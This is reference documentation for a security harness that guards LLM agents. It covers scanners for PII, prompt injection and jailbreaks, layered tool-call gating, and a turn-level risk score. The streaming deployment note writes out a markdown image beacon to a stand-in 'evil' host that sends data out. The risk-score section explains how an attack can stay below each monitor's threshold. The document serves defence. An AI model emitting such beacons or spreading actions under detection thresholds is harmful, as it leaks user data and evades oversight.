# Boundaries Reference

SHAI enforces security at five boundaries. Every call emits exactly one
`AuditEvent`. Boundaries never raise — they always return a verdict.

---

## Ingress Scan (`scan_input`)

```python
verdict = await harness.scan_input(user_text, ctx)

if verdict.blocked:
    return "Input rejected"

# Use redacted_text if the scanner redacted anything
safe_text = verdict.redacted_text or user_text
```

**Runs:** configured scanners (`regex_pii`, `injection_scan`) on the raw user text.
**Catches:** PII (T11), direct prompt injection (T5).
**Audit:** `boundary="input_scan"`, `decision` = allow/warn/blocked.

---

## Named scanner methods

Each scanner is also callable individually through the facade:

```python
from harness import SHAI, RegexPIIScanner, InjectionScanner, MCPMetadataScanner

# Run only PII detection — no injection scan overhead
verdict = await harness.scan_pii(text, ctx)

# Run only injection detection — targeted surface scanning
verdict = await harness.scan_injection(text, ctx)

# Inspect active scanners
print(harness.scanners)
# {
#   'regex_pii':          RegexPIIScanner,
#   'injection_scan':     InjectionScanner,
#   'injection_scan_doc': InjectionScanner(patterns_for_doc),
#   'file_scanner':       FileScanner,
#   'rate_limiter':       RateLimiter,
# }
```

`scan_input` still runs all configured scanners together — the named methods
are for cases where you need a single scanner on a specific surface.

## Tool Governance (`check_tool_call`)

```python
gate = await harness.check_tool_call(tool_name, tool_args, ctx)

if not gate.allowed:
    # Provide denial feedback to the LLM
    return f"Tool call denied: {gate.deny_reason}"

# gate.redacted_args is set when L4 arg scanning redacted something
args = gate.redacted_args or tool_args
result = await my_dispatch(tool_name, args)
```

**Seven layers — first deny anywhere wins:**

| Layer | Check | Bypassable? |
|---|---|---|
| Pre-gate | Rate limit + session execution budget + agent registered? | No |
| L1 | `tool_name` in `allowed_tool_names`? | No |
| L2 | Argument rules (deterministic parameter constraints) | No |
| L3 | Irreversibility gate (destructive tools require `human_approved`) | No |
| L4 | `tool.tags ⊆ ctx.allowed_tags`? (subagents only) | No |
| L5 | Intersection policy (subagent → parent → global) | By design |
| L6 | Signal correlation — reads `TurnSignals` from earlier boundaries | No |
| L7 | Arg scanning — for `sensitive`-tagged tools OR when L6 tightened | Config |

**L1 is absolute.** Nothing can grant access to a tool not in `allowed_tool_names`.

**L6 signal correlation** — the gate reads what earlier boundaries found in this turn:
- **Pattern A · deny.** Input scan flagged injection AND the target tool carries a
  `destructive` / `financial` / `external` tag → deny. Reason:
  `"correlated with input injection signal — tool has high-risk tag(s): [...]"`.
- **Pattern B · tighten.** Input scan returned WARN AND the target tool is
  write-capable (no `read` tag) → L7 runs arg scanning unconditionally, even
  when the tool has no `sensitive` tag.

L6 is a no-op when `TurnSignals` is absent (e.g. a boundary called outside a
full turn cycle, or when the operator called `check_tool_call` directly with
`turn_signals=None`). No behavior change from a plain gate call.

**Rate limiter** fires in the pre-gate. Sliding-window token bucket per agent.
Two counters: global call budget + per-tool budget. Both must pass.

**Dispatch token** is issued when `connectivity.enabled: true`:
```python
gate.dispatch_token  # str | None — pass to source.call()
```

---

## Tool Stream Control (`scan_tool_result`)

```python
# Basic — always scans
tverdict = await harness.scan_tool_result(result, ctx)

# Better — with tool_name lets connector manifests skip non-risky tools
tverdict = await harness.scan_tool_result(result, ctx, tool_name="get_issue")

if tverdict.blocked:
    result = "Tool result blocked by security policy"
else:
    result = tverdict.redacted_text or result
```

**Runs:** `patterns_for_doc.yaml` (injection-pattern rules tuned for document content).
**Catches:** indirect prompt injection embedded in tool results (T6).

**Signal-driven tightening.** When `TurnSignals` shows that the input scan
flagged injection and the gate allowed a specific tool this turn,
`scan_tool_result` steps `block_at` down one level for this call only
(HIGH → MEDIUM, MEDIUM → LOW, floored at LOW). Rationale: the attack chain
is in motion — treat lower-severity result findings as blocking evidence
they are not yet the top of the funnel. Transparent to the caller; the
audit event records the effective severity used.

**`tool_name` parameter and `scan_tool_result_on`:**
When a connector manifest declares `scan_tool_result_on`, only those tools
are scanned. Tools not in the list emit a `disabled=True` audit event and
return `ScanVerdict(allow)` without running scanners.

When `tool_name` is `None` or no manifest is loaded, all results are scanned.
This is the safe default — backward compatible.

---

## Egress Scan (`scan_output`)

```python
out_verdict = await harness.scan_output(llm_response, ctx)

if out_verdict.blocked:
    return "[Response blocked by security policy]"

return out_verdict.redacted_text or llm_response
```

**Runs:** configured scanners (typically `regex_pii`, optionally the output
prompt-leakage catalog from the extended DB) on the LLM response.
**Catches:** PII leakage in responses (T11), data exfiltration via
markdown/HTML beacons (T16), assistant-side prompt-echo leakage.
**Audit:** `boundary="output_scan"`.

### Consolidated turn-risk block

`scan_output` also acts as the **final aggregator** across every boundary
this turn. After the individual scanners run, it computes a consolidated
`turn_risk` from the `TurnSignals` bus and applies a hard block when it
crosses `RISK_HIGH` (0.60) — regardless of whether any individual scanner
blocked:

```python
turn_risk = ctx.turn_signals.compute_risk()   # 0.0 .. ~0.99
if turn_risk >= RISK_HIGH and not verdict.blocked:
    verdict = ScanVerdict(status=BLOCK)        # consolidated block
    # audit event carries extra.turn_risk and extra.signal_source="consolidated"
```

**Why this matters.** An attack can distribute itself below every single
boundary's threshold — WARN input, WARN tool result, ALLOW output — while
each finding on its own is unremarkable. The consolidated score catches
that pattern. The score has three additive components (input, execution,
result) with chain multipliers (× 1.20 full chain, × 1.08 exposure only)
and an exponential ceiling `1 - e^(-raw)` that asymptotes below 1.0.

Constants:
- `RISK_ELEVATED = 0.30` — informational; used by other subsystems.
- `RISK_HIGH     = 0.60` — hard block at `scan_output`.

The consolidated block emits an audit event with:
```
boundary      = output_scan
decision      = blocked
deny_reason   = "consolidated turn risk {:.2f} exceeds high threshold (0.60)"
extra         = { "turn_risk": 0.71, "signal_source": "consolidated" }
```

`ctx.turn_signals` is cleared at the end of `scan_output` — one turn, one
signal bus, no leakage across turns. Subagent contexts do not inherit the
parent's `turn_signals`.

---

## Ingress Scan — File (`scan_file`)

```python
verdict = await harness.scan_file("/tmp/upload.pdf", ctx)

if verdict.blocked:
    return "File rejected"
```

**Two passes:**
1. **Structural** — MIME type, extension, size gate, double-extension
   disguise (`invoice.pdf.exe`), PDF marker set (`/JavaScript`, `/JS`,
   `/OpenAction`, `/AA`, `/Launch`, `/EmbeddedFile`, `/RichMedia`),
   SVG script/handler/`javascript:` scan, EXIF + XMP metadata extraction,
   ZIP entry-count and compression-ratio bomb detection, Office macros.
2. **Content** — extracted text AND image metadata routed through the
   configured `text_scanners` chain (injection + jailbreak + identity_spoof
   when configured). Image-metadata hits are prefixed
   `file.image_metadata.*` in the audit trail so operators can distinguish
   document-body findings from EXIF/XMP findings without losing the
   underlying category.

**Disabled by default** — set `scan_file.enabled: true` in harness.yaml.

---

## Audit invariants (all boundaries)

- **One event per call, always** — even on pre-gate failure or exception.
- **No raw text** — no user input, LLM output, args, or matched substrings.
- `decision=deny` only on `tool_call_gate`.
- `decision=blocked` / `decision=warn` only on scan boundaries.
- `disabled=True` → `decision=allow`, scanners not run.
- `tenant_id` comes from config, never from the caller.

---

## Scanner catalog

| Class | Import | Catalog | Used in |
|---|---|---|---|
| `RegexPIIScanner` | `harness.adapters.scanners.regex_pii` | Built-in PII + secrets (Luhn-validated cards, structure-validated SSNs, `secret.private_key`, `secret.jwt`, `secret.aws_secret`, `secret.conn_string`, `secret.slack_webhook`) | `scan_input`, `scan_output`, arg scanning |
| `InjectionScanner` | `harness.adapters.scanners.injection_scan` | `injection_patterns.yaml` — direct injection, tool coercion, encoded payloads, delimiter smuggling (incl. KaTeX/LaTeX invisible text) | `scan_input` |
| `InjectionScanner` (doc) | same class, different catalog | `patterns_for_doc.yaml` — tuned for document content | `scan_tool_result`, `FileScanner` content pass |
| `JailbreakScanner` | `harness.adapters.scanners.jailbreak_scan` | `jailbreak_patterns.yaml` — persona override, refusal suppression, mode activation, prompt extraction, hypothetical laundering | Any text boundary |
| `IdentitySpoofScanner` | `harness.adapters.scanners.identity_spoof_scan` | `identity_spoof_patterns.yaml` — claimed orchestrator/system authority, peer-privilege claims, tool-result authority | High value at `scan_tool_result` |
| `HeuristicScanner` | `harness.adapters.scanners.heuristic_scan` | Not YAML-driven. 5 sub-scores: entropy, instruction density, coherence, structural markers, **typoglycemia** (Damerau-Levenshtein-1 against an intent-space keyword list, with anagram-scramble fast path and prefix-relationship rejection so morphology like `ignored`, `filters`, `systems` is not scored) | Always on |
| `FileScanner` | `harness.adapters.scanners.file_scanner` | Structural + doc patterns + full text-scanner content pass | `scan_file` |
| `MCPMetadataScanner` | `harness.adapters.scanners.mcp_metadata_scanner` | `mcp_metadata_patterns.yaml` | MCP `tools/list` registration |
| `RateLimiter` | `harness.adapters.scanners.rate_limiter` | — (config-driven) | `check_tool_call` pre-gate |

**Method-family attribution.** Every scanner declares `method_family` — one of
`regex_catalog`, `structural_heuristic`, `regex_pii`, `ml_classifier`,
`unknown`. `TurnSignals` uses this for corroboration bonuses in the risk
score: two `regex_catalog` scanners agreeing count as **one** family (no
bonus), while injection + heuristic count as two (bonus applied). This
prevents catalog scanners from double-counting themselves into HIGH.

**Catalog files** (built-in, under `src/harness/adapters/scanners/l10n/`):
- `injection_patterns.yaml` — 17+ rules, tuned for user text input.
- `patterns_for_doc.yaml` — lower-FP variant for document/structured content.
- `jailbreak_patterns.yaml` — guardrail-integrity rules.
- `identity_spoof_patterns.yaml` — inter-agent trust rules.
- `mcp_metadata_patterns.yaml` — most sensitive (default `block_at: medium`).

Additional rules can be signed into the extended pattern DB — see
`02-harness-yaml.md` for the pattern-database CLI workflow.

## TurnSignals — cross-boundary signal bus

`TurnSignals` is a per-turn mutable state object attached to `AgentContext`
by `scan_input` and cleared by `scan_output`. Each boundary writes what it
found; downstream boundaries read to make sharper decisions.

```
scan_input     → writes { verdict, categories, method_families }
check_tool_call → reads for L6 correlation; writes { gate_verdict, tool_name, tool_tags }
scan_tool_result → reads to tighten block_at when input flagged injection;
                   writes { verdict, categories }
scan_output    → reads all of the above, computes consolidated turn_risk,
                 blocks turn if turn_risk ≥ RISK_HIGH, then clears signals
```

Every consumer treats the absence of signals as "no cross-boundary evidence"
and behaves like a standalone boundary. There is no way to over-block: the
correlation layer denies only when input **and** result **and** target-tag
evidence all agree; the risk block requires cumulative evidence across the
turn to cross a fixed threshold.

**Not propagated to subagents.** `ctx.scope_subagent(...)` returns a fresh
context; a subagent invocation is a separate turn.

## Deployment note — do not stream `scan_output`

The boundary contract assumes the full output text is scanned as a unit.
Streaming markdown to the user before `scan_output` returns creates an
exfiltration channel our patterns cannot close — a
`![...](https://evil?data=...)` beacon can execute in the client renderer
before the finding is emitted.

Two safe deployments:
1. **Buffer to the boundary.** Hold the model's response, call `scan_output`,
   deliver only after the verdict returns.
2. **Client-side CSP.** If a streaming UX is required, disable `scan_output`
   (`enabled: false`) and compensate with a content-security-policy that
   forbids external image/link fetches with query parameters.

The `markdown_exfiltration` rule in the extended DB catches the payload
shape, but the deployment discipline above is what ensures the finding
arrives before the render.

---

## collect_events() — capture events in-process

```python
with harness.collect_events() as events:
    verdict = await harness.scan_input(text, ctx)
    gate    = await harness.check_tool_call(name, args, ctx)
    result  = await dispatch(name, args)
    tv      = await harness.scan_tool_result(result, ctx)

# events is list[AuditEvent], populated after the block
for ev in events:
    print(ev.boundary, ev.decision, ev.tool_name)
```

`collect_events()` doesn't affect configured sinks (file, stdout).
Multiple concurrent `collect_events()` blocks are safe — each gets its
own independent list.

→ See `05-verdicts-events.md` for `AuditEvent` field reference.
